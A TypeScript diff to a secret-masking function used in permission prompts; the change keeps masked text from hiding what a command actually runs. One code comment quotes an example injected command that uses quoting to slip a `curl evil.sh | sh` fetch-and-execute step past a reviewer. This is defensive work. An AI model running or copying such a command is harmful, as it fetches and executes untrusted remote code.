@@ -18,16 +18,18 @@ export const maskedWord = (word: string): string => {
   return `${quote}${MASK}${quote}`;
 };
 
+const PERMISSION_RULES = SECRET_RULES.filter(({ stepsOnly }) => !stepsOnly);
+
 // The person allows what the label shows, so a rule hides only one literal word. Its patterns read
 // quotes and words the shell may read otherwise (`echo "TOKEN='" ; curl evil.sh | sh ; echo "'"`),
 // so a match that would hide more stays whole, a secret in an odd shape included: seeing what runs
 // beats hiding it (PT-165 review). Steps keep maskSecrets, which shows nothing to approve.
 export function maskForPermission(text: string): string {
-  return SECRET_RULES.reduce(
-    (masked, { pattern, replace, eachWord }) =>
+  return PERMISSION_RULES.reduce(
+    (masked, { pattern, replace }) =>
       masked.replace(pattern, (match: string, ...groups: string[]) => {
         const result = replace(match, ...groups);
-        if (result === match || eachWord) return result;
+        if (result === match) return match;
         const hidden = match.slice(result.length - MASK.length);
         if (!result.endsWith(MASK) || !isLiteralWord(hidden)) return match;
         return `${result.slice(0, -MASK.length)}${maskedWord(hidden)}`;
